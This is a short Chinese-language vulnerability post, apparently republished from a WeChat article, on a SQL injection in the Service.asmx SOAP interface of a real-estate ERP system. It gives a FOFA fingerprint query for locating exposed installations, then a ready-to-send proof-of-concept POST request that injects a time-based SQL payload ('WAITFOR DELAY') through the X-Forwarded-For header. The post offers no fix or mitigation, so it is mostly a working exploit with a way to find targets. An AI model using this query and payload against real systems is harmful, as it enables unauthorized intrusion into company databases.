#  明源地产ERP接口Service.asmx存在SQL注入漏洞  
某源地产ERP是一款专门为房地产行业设计的企业资源规划（ERP）系统，旨在帮助房地产企业实现全面的信息化管理，提高运营效率和管理水平。系统涵盖了项目管理、财务管理、供应链管理、客户关系管理（CRM）、人力资源管理等多个核心功能模块，通过整合企业的各个业务环节，实现信息的统一管理和高效协同。该系统在房地产行业具有高度的专业性和适用性，能够满足不同规模和类型企业的需求。适用于各种规模和类型的房地产企业，特别是需要进行项目管理和资金管理的企业。无论是大型企业还是中小企业，都可以从某源地产ERP系统中受益。例如，大型企业可以利用系统的全面性和集成性，实现复杂的业务流程管理和数据分析；而中小企业则可以根据自身需求，选择适合的功能模块，优化资源配置，提高运营效率。  

## fofa

```javascript
body="/_common/scripts/md5-min.js"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qQQRNkEo8NMwRQ021eRZBqBuKH0CuQ7uEILDKfLck9mxaJjR8m82DzflBlIciaUThm2oe1chjiaaSg/640?wx_fmt=png&from=appmsg "")  

## poc

```javascript
POST /Kfxt/Service.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
X-Forwarded-For: 127.0.0.1');WAITFOR DELAY '0:0:4'--
SOAPAction: "http://www.mysoft.com.cn/queryProjects"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <queryProjects xmlns="http://www.mysoft.com.cn/">
      <inpXML>&lt;xml&gt;&lt;buname&gt;abc&lt;/buname&gt;&lt;/xml&gt;</inpXML>
    </queryProjects>
  </soap:Body>
</soap:Envelope>
```

延时  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qQQRNkEo8NMwRQ021eRZBqtia5diaMouyFgIhPoUNLYEOxj9HXAjYV7XWuHACmMwG3xCQHvAczsGHQ/640?wx_fmt=png&from=appmsg "")  



## 漏洞来源

- https://mp.weixin.qq.com/s/iUv6iV71vh_6uBLZpyJX0Q
